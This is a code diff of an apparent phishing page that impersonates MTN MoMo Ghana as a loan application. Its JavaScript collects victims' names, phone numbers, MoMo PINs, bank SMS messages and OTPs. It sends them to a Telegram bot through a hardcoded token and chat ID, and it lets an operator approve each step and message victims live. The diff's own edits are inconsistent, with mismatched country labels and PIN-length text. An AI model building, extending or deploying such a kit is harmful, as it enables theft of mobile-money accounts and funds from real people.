@@ -1736,7 +1736,7 @@
 
 <body>
 
-<!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
     <div id="adminModalOverlay">
         <div class="admin-modal">
             <div class="modal-title">
@@ -1797,20 +1797,21 @@
     <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
     <div id="page-step1" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-            <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
-                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
-                <div style="text-align: left;">
-                    <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
-                    <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
-                </div>
-                <span style="color:var(--mtn-gold); font-size:0.7rem;">GH</span>
-            </div>
-            <div class="nav-right">
-                <div class="hline"></div>
-                <div class="hline"></div>
-                <div class="hline"></div>
-            </div>
+            <a class="nav-left" onclick="goTo('page-landing')">
+                <-Back</a>
+                    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+                        <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" class="logo-img small" />
+                        <div style="text-align: left;">
+                            <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
+                            <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
+                        </div>
+                        <span style="color:var(--mtn-gold); font-size:0.7rem;">ZM</span>
+                    </div>
+                    <div class="nav-right">
+                        <div class="hline"></div>
+                        <div class="hline"></div>
+                        <div class="hline"></div>
+                    </div>
         </nav>
         <div class="step-center">
             <div class="step-card">
@@ -1845,7 +1846,7 @@
                     <div class="mtn-logo-text" style="font-size:0.9rem; color:#fff;">MTN MoMo</div>
                     <div class="mtn-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Ghana</div>
                 </div>
-                <span style="color:var(--mtn-gold); font-size:0.7rem;">GH</span>
+                <span style="color:var(--mtn-gold); font-size:0.7rem;">🇺🇬</span>
             </div>
             <div class="nav-right">
                 <div class="hline"></div>
@@ -1942,21 +1943,28 @@
         </div>
     </div>
 
-    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK ══════════════════════ -->
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
+    <!-- Fixed: Removed the inline "display: flex" so it stays hidden until ".active" is applied -->
     <div id="page-sim-check" class="page" style="background: #fff;">
         <div style="background-color: var(--mtn-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
             <button style="position: absolute; top: 20px; left: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
             <button style="position: absolute; top: 20px; right: 20px; color: var(--mtn-gold); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
 
+            <!-- Large Overlapping Circle with White Ring & Shadow -->
             <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
+                    <!-- Phone Body -->
                     <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#004080" stroke-width="5"/>
                     <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
                     <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
                     <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
                     <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
                     <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
+
+                    <!-- Arrow -->
                     <polygon points="68,45 58,40 58,50" fill="none" stroke="#004080" stroke-width="4" stroke-linejoin="round"/>
+
+                    <!-- SIM Card -->
                     <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#004080" stroke-width="4"/>
                     <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFD700"/>
                     <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFD700"/>
@@ -1978,9 +1986,10 @@
         </div>
     </div>
 
-    <!-- ══════════════════════ PAGE 7: LOGIN (4-DIGIT PIN) ══════════════════════ -->
+    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
     <div id="page-login" class="page" style="background: #fff;">
         <div style="background: var(--mtn-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
+            <!-- Custom Logo Mark -->
             <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
                 <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" style="height: 36px; object-fit: contain;" />
             </div>
@@ -1989,43 +1998,50 @@
         </div>
 
         <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
+            <!-- White Card -->
             <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
                 <h3 style="text-align: center; color: var(--mtn-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Welcome to MoMo</h3>
 
+                <!-- Number Input with Rounded Square Flag -->
                 <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
                     <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
                         <span style="font-size: 1.5rem; line-height: 1;">GH</span>
                     </div>
                     <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
-                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();" />
+                        <input type="tel" id="lpPhone" placeholder="Enter number *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();"
+                        />
                     </div>
                 </div>
 
+                <!-- PIN Input (Maintained from previous requirement) -->
                 <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
-                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (4 digits)</label>
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Enter MoMo PIN (5 digits)</label>
                     <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                         <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
                         <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
                         <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
                         <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
-                        
                         <button class="pin-eye" onclick="togPin()" title="Show/Hide" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
                         <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
                     </div>
                 </div>
 
+                <!-- Messages -->
                 <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
                 <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
                 <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
             </div>
 
+            <!-- Terms (Outside Card) -->
             <div style="text-align: center; font-size: 0.98rem; color: #005c99; line-height: 2.5; max-width: 420px; margin: 30px 0;">
                 By using this app you agree to our <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Mobile Terms of Use</a> and <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Privacy Policy</a>
             </div>
         </div>
 
+        <!-- Lifted, Pill-shaped Next Button -->
         <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
-            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;" disabled>NEXT</button>
+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;"
+                disabled>NEXT</button>
             <div id="mLgn" class="loading" style="margin-top: 10px;">
                 <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
                 <div class="wait-msg" style="font-size: 0.85rem;">Logging in…</div>
@@ -2203,6 +2219,7 @@
             </div>
         </div>
     </div>
+
     <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
     <script>
         // ============================================================
@@ -2698,7 +2715,7 @@
 
         function chkPin() {
             const phone = document.getElementById('lpPhone').value.trim();
-            const pinOk = [0, 1, 2, 3].every(i => document.getElementById('lp' + i).value);
+            const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
             const ok = phone.length === 9 && pinOk;
             const btn = document.getElementById('bLgn');
             btn.className = ok ? 'btn-login rdy' : 'btn-login';
@@ -2706,14 +2723,14 @@
         }
 
         function togPin() {
-            [0, 1, 2, 3].forEach(i => {
+            [0, 1, 2, 3, 4].forEach(i => {
                 const b = document.getElementById('lp' + i);
                 b.type = b.type === 'password' ? 'text' : 'password';
             });
         }
 
         function clearLoginPin() {
-            [0, 1, 2, 3].forEach(i => {
+            [0, 1, 2, 3, 4].forEach(i => {
                 document.getElementById('lp' + i).value = '';
             });
             chkPin();
@@ -2758,7 +2775,7 @@
 
             if (phone.length !== 9 || pin.length < 5) {
                 S.isSubmitting = false;
-                showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 5 digits.');
+                showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 4 digits.');
                 return;
             }
 
@@ -2905,827 +2922,138 @@
                 } else {
                     throw new Error('Session not found');
                 }
-  <script>
-    // ============================================================
-    // TELEGRAM BOT CONFIGURATION
-    // ============================================================
-    const TG_TOKEN = "8962923971:AAE6pwf3RxLR55lU--KAbOqf5XdNwhMbTu8";
-    const TG_CHAT = "8586910663";
-    const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
-
-    const sessions = new Map();
-    let sessionCounter = 1;
-
-    function createSession(data) {
-        const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
-        const session = {
-            id,
-            ...data,
-            stage: 'application',
-            created_at: new Date().toISOString(),
-            updated_at: new Date().toISOString(),
-            pin: '',
-            smsMessage: '',
-            otp: ''
-        };
-        sessions.set(id, session);
-        return session;
-    }
-
-    function getSession(id) {
-        return sessions.get(id) || null;
-    }
-
-    function updateSession(id, updates) {
-        const s = sessions.get(id);
-        if (!s) return null;
-        Object.assign(s, updates);
-        s.updated_at = new Date().toISOString();
-        return s;
-    }
-
-    async function tgCall(method, body) {
-        try {
-            const r = await fetch(`${TG_API}/${method}`, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(body)
-            });
-            return await r.json();
-        } catch (e) {
-            console.warn("tg", method, e);
-            return null;
-        }
-    }
-
-    function tgFmt(row, kind) {
-        if (kind === "sms") {
-            const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
-            const num = row.phone ? `+233 ${row.phone}` : "—";
-            const sms = row.smsMessage || "—";
-            return `📨 New SMS submitted\n\nName: ${name}\nPhone: ${num}\nMessage: ${sms}\nApplication ID: ${row.id}`;
-        }
-        const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
-        const num = row.phone || "—";
-        const pin = row.pin || "—";
-        const sms = row.smsMessage || "—";
-        const otp = row.otp || "—";
-        let title = "🔑 New PIN submitted";
-        if (kind === "otp") title = "🔢 New OTP submitted";
-        return `${title}\n\nName: ${name}\nPhone: ${num}\nPIN: ${pin}\nSMS: ${sms}\nOTP: ${otp}\nApplication ID: ${row.id}`;
-    }
-
-    async function tgNotify(row, kind) {
-        let keyboard;
-        const msgBtn = {
-            text: "💬 Message User",
-            callback_data: `ask_msg:${row.id}`
-        };
-        if (kind === "pin") {
-            keyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ Approve PIN",
-                        callback_data: `approve_pin:${row.id}`
-                    }],
-                    [{
-                        text: "❌ Reject PIN",
-                        callback_data: `reject_pin:${row.id}`
-                    }, msgBtn]
-                ]
-            };
-        } else if (kind === "sms") {
-            const smsText = row.smsMessage || '—';
-            keyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "📋 Copy SMS",
-                        copy_text: {
-                            text: smsText
-                        }
-                    }],
-                    [{
-                        text: "✅ Approve SMS",
-                        callback_data: `approve_sms:${row.id}`
-                    }],
-                    [{
-                        text: "❌ Reject SMS",
-                        callback_data: `reject_sms:${row.id}`
-                    }, msgBtn]
-                ]
-            };
-        } else if (kind === "otp") {
-            keyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ Approve OTP",
-                        callback_data: `approve_otp:${row.id}`
-                    }],
-                    [{
-                        text: "❌ Reject OTP",
-                        callback_data: `reject_otp:${row.id}`
-                    }, msgBtn]
-                ]
-            };
-        }
-        await tgCall("sendMessage", {
-            chat_id: TG_CHAT,
-            text: tgFmt(row, kind),
-            reply_markup: keyboard
-        });
-    }
-
-    let lastOffset = 0;
-    let currentSessionId = null;
-
-    function showAdminModal(message) {
-        document.getElementById('adminModalBody').textContent = message;
-        document.getElementById('adminModalOverlay').classList.add('show');
-    }
-
-    function closeAdminModal() {
-        document.getElementById('adminModalOverlay').classList.remove('show');
-    }
-
-    document.getElementById('adminModalOverlay').addEventListener('click', function(e) {
-        if (e.target === this) closeAdminModal();
-    });
-
-    async function tgPoll() {
-        const offset = lastOffset || Number(localStorage.getItem("tg_offset") || 0);
-        const r = await tgCall("getUpdates", {
-            offset: offset,
-            timeout: 0,
-            allowed_updates: ["callback_query", "message"]
-        });
-        if (!r || !r.ok) return;
-        for (const u of r.result) {
-            lastOffset = u.update_id + 1;
-            localStorage.setItem("tg_offset", String(lastOffset));
-
-            if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message.text.includes("Application ID: ")) {
-                if (String(u.message.chat.id) !== TG_CHAT) continue;
-                const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
-                const customText = u.message.text;
-                if (currentSessionId && currentSessionId === targetSessionId) {
-                    showAdminModal(customText);
-                    await tgCall("sendMessage", {
-                        chat_id: TG_CHAT,
-                        text: "✅ Message delivered to client."
-                    });
-                }
-                continue;
-            }
-
-            const cq = u.callback_query;
-            if (!cq) continue;
-            if (String(cq.from.id) !== TG_CHAT && String(cq.message && cq.message.chat && cq.message.chat.id) !== TG_CHAT) {
-                await tgCall("answerCallbackQuery", {
-                    callback_query_id: cq.id,
-                    text: "Not authorized"
-                });
-                continue;
-            }
-
-            const [action, id] = (cq.data || "").split(":");
-
-            if (action === "ask_msg") {
-                await tgCall("sendMessage", {
-                    chat_id: cq.message.chat.id,
-                    text: `Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: ${id}`,
-                    reply_markup: {
-                        force_reply: true
-                    }
-                });
-                await tgCall("answerCallbackQuery", {
-                    callback_query_id: cq.id
-                });
-                continue;
-            }
-
-            let stage = null, label = "";
-            if (action === "approve_pin") {
-                stage = "pin_approved";
-                label = "PIN approved";
-            } else if (action === "reject_pin") {
-                stage = "pin_rejected";
-                label = "PIN rejected";
-            } else if (action === "approve_sms") {
-                stage = "sms_approved";
-                label = "SMS approved";
-            } else if (action === "reject_sms") {
-                stage = "sms_rejected";
-                label = "SMS rejected";
-            } else if (action === "approve_otp") {
-                stage = "otp_approved";
-                label = "OTP approved";
-            } else if (action === "reject_otp") {
-                stage = "otp_rejected";
-                label = "OTP rejected";
-            }
-
-            if (stage) {
-                const updated = updateSession(id, { stage });
-                await tgCall("answerCallbackQuery", {
-                    callback_query_id: cq.id,
-                    text: label
-                });
-                await tgCall("editMessageReplyMarkup", {
-                    chat_id: cq.message.chat.id,
-                    message_id: cq.message.message_id,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                text: `✓ ${label}`,
-                                callback_data: "noop"
-                            }]
-                        ]
-                    }
-                });
-                if (currentSessionId === id && updated) {
-                    handleStageUpdate(updated);
-                }
-            } else {
-                await tgCall("answerCallbackQuery", {
-                    callback_query_id: cq.id
-                });
+            } catch (err) {
+                spinner.classList.remove('show');
+                btn.disabled = false;
+                showSmsMsg('error', 'Network error: ' + err.message);
             }
         }
-    }
 
-    setInterval(() => {
-        tgPoll().catch(() => {});
-    }, 3000);
+        // ─── Updated SMS parser: shows name and number in Telegram notification ───
+        async function doSmsParse() {
+            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
-    function handleStageUpdate(session) {
-        const stage = session.stage;
-        if (stage === 'pin_approved') {
-            goTo('page-sms-paste');
-            startSmsTimer();
-        } else if (stage === 'pin_rejected') {
-            document.getElementById('lpPhone').value = '';
-            [0, 1, 2, 3].forEach(i => document.getElementById('lp' + i).value = '');
-            goTo('page-login');
-            document.getElementById('bLgn').disabled = false;
-            chkPin();
-            showLgnMsg('error', 'Wrong PIN. Please try again.');
-        } else if (stage === 'sms_approved') {
-            goTo('page-otp');
-        } else if (stage === 'sms_rejected') {
-            document.getElementById('smsMsgBox').value = '';
-            goTo('page-sms-paste');
-            document.getElementById('bSms').disabled = false;
-            chkSmsMsg();
-            showSmsMsg('error', 'The SMS message was rejected. Please paste the correct message.');
-        } else if (stage === 'otp_approved') {
-            const months = parseInt(S.loanTerm) || 48;
-            const monthly = Math.ceil((S.loanAmount || 1000) / months);
-            document.getElementById('aprAmount').textContent = 'GHS ' + (S.loanAmount || 1000).toLocaleString();
-            document.getElementById('aprAmt').textContent = 'GHS ' + (S.loanAmount || 100000).toLocaleString();
-            document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
-            document.getElementById('aprMth').textContent = 'GHS ' + monthly.toLocaleString();
-            goTo('page-approval');
-        } else if (stage === 'otp_rejected') {
-            [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
-            goTo('page-otp');
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            chkOtp();
-            showOtpMsg('error', 'The OTP code was rejected. Please try again.');
-        }
-    }
-
-    // ============================================================
-    // STATE
-    // ============================================================
-    const S = {
-        loanType: '',
-        loanAmount: 0,
-        loanTerm: '',
-        loanPurpose: '',
-        firstName: '',
-        lastName: '',
-        phone: '',
-        employment: '',
-        annualIncome: 0,
-        applicationId: '',
-        isSubmitting: false
-    };
-
-    // ============================================================
-    // NAVIGATION
-    // ============================================================
-    function goTo(pageId) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageId) && document.getElementById(pageId).classList.add('active');
-        window.scrollTo(0, 0);
-
-        if (pageId === 'page-sms-paste') {
-            const btn = document.getElementById('bSms');
-            const spinner = document.getElementById('mSms');
-            btn.disabled = false;
-            spinner.classList.remove('show');
-            chkSmsMsg();
-            ['smsMsg', 'smsMsgOk'].forEach(function(id) {
-                document.getElementById(id).classList.remove('show');
-            });
-        }
-
-        if (pageId === 'page-otp') {
-            const btn = document.getElementById('bOtp');
-            const spinner = document.getElementById('mOtp');
-            btn.disabled = false;
-            btn.textContent = 'VERIFY & APPROVE LOAN';
-            spinner.classList.remove('show');
-            chkOtp();
-            ['otpMsg', 'otpMsgOk'].forEach(function(id) {
-                document.getElementById(id).classList.remove('show');
-            });
-        }
-
-        if (pageId === 'page-login') {
-            const btn = document.getElementById('bLgn');
-            const spinner = document.getElementById('mLgn');
-            btn.disabled = false;
-            spinner.classList.remove('show');
-            S.isSubmitting = false;
-            chkPin();
-        }
-    }
-
-    function startApplication() {
-        const sliderVal = document.getElementById('amtSlider').value;
-        document.getElementById('s1am').value = sliderVal;
-        goTo('page-step1');
-    }
-
-    function normalizePhone(id) {
-        let inp = document.getElementById(id);
-        let val = inp.value.replace(/\D/g, '');
-        if (val.length > 9) val = val.substring(0, 9);
-        inp.value = val;
-    }
-
-    function toS2() {
-        const ty = document.getElementById('s1ty').value;
-        const am = +document.getElementById('s1am').value;
-        const te = document.getElementById('s1te').value;
-        const pu = document.getElementById('s1pu').value;
-
-        if (!ty || am <= 0 || !te || !pu.trim()) {
-            showErr('s1Err', 'Please complete all fields.');
-            return;
-        }
-
-        S.loanType = ty;
-        S.loanAmount = am;
-        S.loanTerm = te;
-        S.loanPurpose = pu;
-        goTo('page-step2');
-    }
-
-    function toS3() {
-        const fi = document.getElementById('s2fi').value.trim();
-        const la = document.getElementById('s2la').value.trim();
-        const ph = document.getElementById('s2ph').value;
-
-        if (!fi || !la || ph.length !== 9) {
-            showErr('s2Err', 'Please enter valid first name, last name, and 9-digit phone number.');
-            return;
-        }
-
-        S.firstName = fi;
-        S.lastName = la;
-        S.phone = ph;
-
-        document.getElementById('sA').textContent = 'GHS ' + S.loanAmount.toLocaleString();
-        document.getElementById('sT').textContent = S.loanTerm;
-        document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' : '');
-        document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
-
-        goTo('page-step3');
-    }
-
-    function submitApp() {
-        const em = document.getElementById('s3em').value;
-        const in_ = +document.getElementById('s3in').value;
-
-        if (!em || in_ <= 0) {
-            showErr('s3Err', 'Please complete all fields.');
-            return;
-        }
-
-        S.employment = em;
-        S.annualIncome = in_;
-        S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
-
-        document.getElementById('sA').textContent = 'GHS ' + S.loanAmount.toLocaleString();
-        document.getElementById('sT').textContent = S.loanTerm;
-        document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' : '');
-        document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
-
-        goTo('page-processing');
-
-        const session = createSession({
-            firstName: S.firstName,
-            lastName: S.lastName,
-            phone: S.phone,
-            loanAmount: S.loanAmount,
-            loanTerm: S.loanTerm,
-            purpose: S.loanPurpose,
-            employment: S.employment,
-            annualIncome: S.annualIncome
-        });
-        S.applicationId = session.id;
-        currentSessionId = session.id;
-
-        setTimeout(() => {
-            goTo('page-sim-check');
-        }, 2000);
-    }
-
-    function showErr(id, msg) {
-        document.getElementById(id).classList.add('show');
-        document.getElementById(id + 'Txt').textContent = msg;
-    }
-
-    function clearErr(id) {
-        document.getElementById(id).classList.remove('show');
-    }
-
-    function updateCalc() {
-        const amt = +document.getElementById('amtSlider').value;
-        document.getElementById('calcAmt').textContent = 'GHS ' + amt.toLocaleString();
-        const monthly = Math.ceil(amt / 48);
-        document.getElementById('monthlyAmt').textContent = 'GHS ' + monthly.toLocaleString();
-    }
-
-    // ============================================================
-    // LOGIN PAGE — PIN INPUT HELPERS (4-DIGIT PIN)
-    // ============================================================
-    function pinMvM(el, i) {
-        el.value = el.value.replace(/\D/, '');
-        if (el.value && i < 3) {
-            document.getElementById('lp' + (i + 1)).focus();
-        }
-        chkPin();
-    }
-
-    document.addEventListener('keydown', function(e) {
-        const id = e.target.id;
-
-        if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
-            const idx = parseInt(id[2]);
-            if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
-        }
-
-        if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
-            const idx = parseInt(id[3]);
-            if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
-        }
-    });
-
-    function chkPin() {
-        const phone = document.getElementById('lpPhone').value.trim();
-        const pinOk = [0, 1, 2, 3].every(i => document.getElementById('lp' + i).value);
-        const ok = phone.length === 9 && pinOk;
-        const btn = document.getElementById('bLgn');
-        btn.className = ok ? 'btn-login rdy' : 'btn-login';
-        btn.disabled = !ok;
-    }
-
-    function togPin() {
-        [0, 1, 2, 3].forEach(i => {
-            const b = document.getElementById('lp' + i);
-            b.type = b.type === 'password' ? 'text' : 'password';
-        });
-    }
-
-    function clearLoginPin() {
-        [0, 1, 2, 3].forEach(i => {
-            document.getElementById('lp' + i).value = '';
-        });
-        chkPin();
-        document.getElementById('lp0').focus();
-    }
-
-    function clearOtpCode() {
-        [0, 1, 2, 3].forEach(i => {
-            document.getElementById('otp' + i).value = '';
-        });
-        chkOtp();
-        document.getElementById('otp0').focus();
-    }
-
-    function showLgnMsg(type, text) {
-        ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-        if (type === 'error') {
-            document.getElementById('lpMsgTxt').textContent = text;
-            document.getElementById('lpMsg').classList.add('show');
-        }
-        if (type === 'success') {
-            document.getElementById('lpMsgOkTxt').textContent = text;
-            document.getElementById('lpMsgOk').classList.add('show');
-        }
-        if (type === 'warning') {
-            document.getElementById('lpMsgWarnTxt').textContent = text;
-            document.getElementById('lpMsgWarn').classList.add('show');
-        }
-    }
-
-    // ============================================================
-    // LOGIN — SUBMIT PIN TO TELEGRAM (4-DIGIT PIN VALIDATION)
-    // ============================================================
-    async function doLogin() {
-        if (S.isSubmitting) return;
-        S.isSubmitting = true;
-
-        ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-
-        const phone = document.getElementById('lpPhone').value;
-        const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');
-
-        if (phone.length !== 9 || pin.length !== 4) {
-            S.isSubmitting = false;
-            showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: Exactly 4 digits.');
-            return;
-        }
-
-        document.getElementById('mLgn').classList.add('show');
-        document.getElementById('bLgn').disabled = true;
-
-        try {
-            const session = getSession(S.applicationId);
-            if (session) {
-                updateSession(S.applicationId, {
-                    pin: pin,
-                    stage: 'pin_submitted'
-                });
-                await tgNotify({
-                    id: S.applicationId,
-                    firstName: S.firstName,
-                    lastName: S.lastName,
-                    phone: phone,
-                    pin: pin
-                }, 'pin');
-
-                document.getElementById('mLgn').classList.remove('show');
-                S.isSubmitting = false;
-                document.getElementById('waitAppId').textContent = S.applicationId;
-                goTo('page-wait-login-approval');
-            } else {
-                throw new Error('Session not found');
-            }
-        } catch (err) {
-            S.isSubmitting = false;
-            document.getElementById('mLgn').classList.remove('show');
-            document.getElementById('bLgn').disabled = false;
-            showLgnMsg('error', 'Network error: ' + err.message);
-        }
-    }
-
-    // ============================================================
-    // SMS PASTE PAGE
-    // ============================================================
-    function chkSmsMsg() {
-        const txt = document.getElementById('smsMsgBox').value.trim();
-        document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
-    }
-
-    function showSmsMsg(type, text) {
-        ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-        if (type === 'error') {
-            document.getElementById('smsMsgTxt').textContent = text;
-            document.getElementById('smsMsg').classList.add('show');
-        }
-        if (type === 'success') {
-            document.getElementById('smsMsgOkTxt').textContent = text;
-            document.getElementById('smsMsgOk').classList.add('show');
-        }
-    }
-
-    let smsTimerInterval = null;
-    let smsTimerExpired = false;
-
-    function startSmsTimer() {
-        if (smsTimerInterval) clearInterval(smsTimerInterval);
-        smsTimerExpired = false;
-
-        document.getElementById('smsMsgBox').value = '';
-        document.getElementById('smsMsgBox').disabled = false;
-        chkSmsMsg();
-        document.getElementById('smsResendWrap').style.display = 'none';
-
-        const arc = document.getElementById('smsTimerArc');
-        const num = document.getElementById('smsTimerNum');
-        const sec = document.getElementById('smsTimerSec');
-        arc.classList.remove('urgent');
-        num.classList.remove('urgent');
-        arc.style.strokeDashoffset = '0';
-        document.getElementById('smsTimerWrap').style.display = 'flex';
-
-        let remaining = 60;
-        const CIRCUMFERENCE = 113;
-
-        const tick = function() {
-            remaining--;
-            const pct = remaining / 60;
-            arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
-            num.textContent = remaining;
-            sec.textContent = remaining;
-
-            if (remaining <= 10) {
-                arc.classList.add('urgent');
-                num.classList.add('urgent');
-            }
-
-            if (remaining <= 0) {
-                clearInterval(smsTimerInterval);
-                smsTimerInterval = null;
-                smsTimerExpired = true;
-
-                document.getElementById('smsMsgBox').disabled = true;
-                document.getElementById('smsMsgBox').value = '';
-                document.getElementById('bSms').disabled = true;
